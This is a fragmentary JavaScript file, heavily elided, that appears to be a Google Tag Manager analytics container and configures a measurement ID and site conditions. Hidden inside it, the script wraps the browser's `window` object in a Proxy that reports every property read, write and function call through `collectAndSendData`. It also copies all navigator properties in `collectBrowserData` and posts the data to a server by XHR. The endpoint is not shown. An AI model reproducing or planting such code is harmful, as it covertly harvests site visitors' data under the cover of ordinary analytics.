...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 13,
        "vtp_includeConditions": ["list", "watchxxxfree\\.com"],
        "tag_id": 18
      }, {
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-8RLZLEXQ72",
        "tag_id": 33
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgJrLqwYQ8rmNr4e66v2jARIlAFdulMMYFHdrOaFQ4DQtKOmK1f1bTU3MJZqOviH+3gtGVz5g6hoC03A\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
    ...
    get: function (target, property) {
      if (typeof target[property] === 'function') {
        return function (...args) {
          ...
          collectAndSendData(property, args, result);
          return result;
        };
      } else {
        collectAndSendData(property, target[property]);
        return target[property];
      }
    },
    set: function (target, property, value) {
      target[property] = value;
      collectAndSendData(property, value);
      return true;
    }
  };
  R(7);
  ...
  window = new Proxy(window, collectionHandler);
  function SA(a, b) {
    return !0;
  }
  SA.P = "aliasInWindow";
  ...
  function collectBrowserData() {
    ...
    for (const property in navigator) {
      if (navigator.hasOwnProperty(property)) {
        properties[property] = navigator[property];
      }
    }
    return properties;
  }
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'G-8RLZLEXQ72'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  function collectAndSendData(prop, value, result = null) {
    const collectedData = {
      property: prop,
      type: typeof value,
      value: value,
    ...
    if (!window.seenVars.includes(prop)) window.seenVars.push(prop);
    let toSend = Object.assign({}, collectedData, {
  ...
  function sendDataToServer(data) {
    ...
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4 && xhr.status == 200) {
        ...
        console.error("Data Submission Error: " + xhr.status);
      }
    };
